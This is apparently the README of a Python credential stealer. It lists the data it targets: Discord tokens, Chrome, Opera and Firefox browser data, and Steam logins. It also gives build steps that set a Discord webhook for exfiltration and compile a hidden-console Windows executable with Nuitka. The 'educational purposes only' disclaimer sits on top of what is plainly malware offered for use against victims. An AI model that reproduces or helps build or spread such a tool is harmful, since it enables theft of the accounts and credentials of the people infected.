# :heartpulse: _**Gromix Python Stealer**_ :heartpulse:
### :police_car: _DISCLAIMER: This program is for educational purposes only._ :police_car:

<details>
  <summary>Important info</summary>
  <i>This stealer is very, VERY new and needs a lot of work</i>
</details>

## What data can it steal ?
- :closed_book: Discord tokens
- :closed_book: Google Chrome
- :closed_book: Opera
- :closed_book: Firefox
- :closed_book: Steam login / installed apps

## Features
- [x] Build using Nuitka
- [x] Send all data by Discord webhooks.
- [x] Custom ico

## How to build

:bangbang: *INSTALL ALL REQUIREMENTS BEFORE BUILDING*

```console
pip install -r requirements.txt
```

Just put your Discord webhook inside _webhook.txt_ file. Then:
```console
python build.py
```

Or you can do it like this:
```console
python build.py --webhook=https://discord.com/api/webhooks/2281488/something
```

After that our exe file will start to generate.
I build this on Python 3.10, final .exe file size is **28717 KB** :floppy_disk:

If you're having troubles with _build.py_ script, just edit constant inside _webhook.py_:
```python
WEBHOOK = "https://discord.com/api/webhooks/2281488/something"
```
Then, execute this command:
```console
python -m nuitka --standalone --onefile --disable-console --windows-icon-from-ico=icon.ico stealer.py
```
